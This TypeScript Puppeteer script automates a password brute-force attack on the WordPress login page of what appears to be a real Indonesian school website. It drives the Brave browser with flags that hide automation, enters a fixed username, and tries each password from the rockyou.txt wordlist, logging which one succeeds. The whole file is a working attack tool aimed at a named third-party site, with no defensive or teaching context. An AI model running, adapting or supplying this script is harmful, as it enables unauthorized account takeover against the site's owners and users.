import puppeteer, { Browser, Page } from "puppeteer-core";
import fs from "fs";

let browser: Browser;
let p: Page | undefined;

async function getPage(): Promise<Page> {
	if (p) return p;
	browser = await puppeteer.launch({
		headless: false,
		executablePath: "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe",
		args: ["--disable-blink-features=AutomationControlled", "--disable-gpu", "--no-sandbox", "--disable-setuid-sandbox"],
	});
	[p] = await browser.pages();
	return p;
}

async function login(password: string) {
	const page = await getPage();

	await page.goto("https://smkn1bukateja.sch.id/login/");
	await page.type("#user_login", "flymotion");
	await page.type("#user_pass", password);
	await Promise.all([
		page.waitForNavigation(), //
		page.click("#wp-submit"),
	]);
	const html = await page.content();

	if (html.includes("username <strong>flymotion</strong> is incorrect.")) {
		return false;
	}
	return true;
}

async function main() {
	const passwords = fs.readFileSync("rockyou.txt", "utf8").split("\n");
	for (let pass of passwords) {
		if (await login(pass)) {
			console.log("correct: " + pass);
			break;
		} else {
			console.log("wrong: " + pass);
		}
	}
}
main();
